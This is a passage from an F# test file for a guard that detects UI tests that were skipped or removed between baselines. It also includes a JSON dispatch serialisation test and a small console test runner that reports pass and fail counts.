          equal [] (UiGuard.check [ r ] [ r ] [ r ] []) "authorised"
      "ui: a test that became skipped is NowSkipped, not Removed", fun () ->
          let t = { Kind = UiTest; Id = "exports a report" }
          let skipped = { Kind = SkippedTest; Id = t.Id }
          equal [ NowSkipped t ] (UiGuard.check [] [] [ t ] [ skipped ]) "skipped now"
          equal [] (UiGuard.check [] [] [ skipped ] [ skipped ]) "skipped before is debt"
          equal [] (UiGuard.check [] [ t ] [ t ] [ skipped ]) "authorised"
      "ui: new items and baseline skips that vanish are no violation", fun () ->
          let added = { Kind = TestId; Id = "new" }
          let skipped = { Kind = SkippedTest; Id = "old" }
          equal [] (UiGuard.check [] [] [ skipped ] [ added ]) "added; a skipped test deleted is not a lost feature"
      "json: dispatch serialises", fun () ->
          let text = Json.writeDispatch (Dispatcher.dispatch validated.Value)
          check (text.Contains "team-T-001") text ]
    @ Factory.Core.Tests.WorkTests.tests
    @ Factory.Core.Tests.DigestTests.tests
    @ Factory.Core.Tests.UiAcceptanceTests.tests

[<EntryPoint>]
let main _ =
    let mutable failed = 0
    for (name, body) in tests do
        try
            body ()
            printfn "  pass  %s" name
        with
        | AssertFailed m ->
            failed <- failed + 1
            printfn "  FAIL  %s\n        %s" name m
        | e ->
            failed <- failed + 1
            printfn "  FAIL  %s\n        %s" name (e.ToString())
    printfn "\n%d passed, %d failed" (tests.Length - failed) failed
    if failed = 0 then 0 else 1
